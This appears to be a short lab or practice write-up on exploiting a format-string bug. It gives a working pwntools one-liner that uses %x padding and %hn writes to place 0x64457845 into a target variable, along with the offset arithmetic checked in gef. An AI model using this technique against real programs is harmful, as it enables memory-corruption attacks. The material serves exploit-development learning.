In this part we have to write 0x64457845 this to the change me variable


as we know that %n write the number of byte it has before it

so we can %numberx to keep increasing value that is equalvent to the hex of value we need

or write 4 bytes at a time using %hn

python -c 'from pwn import *;val1=p32(0x56559030);val2=p32(0x56559032);print(val1+"AAAA"+val2+"%X%X%X%X%X%X%X%X%X%X%30709x%hn%60416x%hn");'

we place the lower 4 bytes first and higher 4 bytes second, 

we have to have 4 byte junk seperating them as we need a %x to give rest of the values

%hexforlowerbytesx%hn%hexforhigherbytesx%hn

lower bytes we can directly take the decimal value of the hex we want - initial length of values

we need 0x7845, we have already have two address and 4bytes junk

address1 + junk + address2 + %x = 32bytes

0x7845 - 32 = 0x77f5

for the higher bytes we have subtract the 0x6445 - 0x7845

first 2 bytes - llast 2 bytes

if we get a negative value which we do in our case, we add 1 to the first 2bytes

gef➤  p 0x6445 - 0x7845
$4 = 0xffffec00
gef➤  p 0x16445 - 0x7845
$5 = 0xec00

convert the value into decimal
